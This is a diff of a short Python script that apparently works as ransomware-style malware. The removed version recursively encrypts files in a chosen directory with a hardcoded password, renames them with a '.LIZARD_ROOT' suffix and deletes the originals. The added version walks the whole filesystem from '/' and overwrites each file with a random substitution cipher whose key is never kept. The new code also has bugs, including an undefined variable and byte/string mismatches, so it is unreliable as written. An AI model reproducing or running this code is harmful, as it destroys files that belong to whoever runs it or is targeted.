@@ -1,23 +1,35 @@
-#!usr/bin/python3
+#!/usr/bin/python3
 
+import string
+import random
+import pathlib
+import sys
 import os
-import pyAesCrypt as crypt
 
-path_to_director = str(input("Enter the director for encrypt ==> "))
+path = '/'
 
-def encrypt(file):
-  password = '123'
-  buffer_sz = 512*1024
-  crypt.encryptFile(file, file + ".LIZARD_ROOT", password, buffer_sz)
-  print(f"File {file} encrypt")
-  os.remove(file)
- 
-def search_dir(dir):
-  for name in os.listdir(dir):
-    path = os.path.join(dir, name)
-    if os.path.isfile(path) == True:
-      encrypt(path)
-    else:
-      search_dir(path)
-      
-search_dir(path_to_director)
+def encrypt_file(file):
+        char = list(" " + string.ascii_letters + string.digits + string.punctuation)
+        key = char.copy()
+        random.shuffle(key)
+        try:
+                with open(file, 'rb') as r_file:
+                        data = r_file.read()
+                encrypt_text = ''
+                for letter in data:
+                        index = chars.index(letter)
+                        encrypt_text += key[index]
+                with open(file, 'wb') as w_file:
+                        w_file.write(encrypt_text)
+                        print(f'{file} encrypt')
+        except PermissionError:
+                pass
+
+def encrypt_folder(path=path):
+        for file in pathlib.Path(path).glob('*'):
+                if os.path.isfile(file):
+                        encrypt_file(file)
+                else:
+                        encrypt_folder(file)
+
+encrypt_folder()
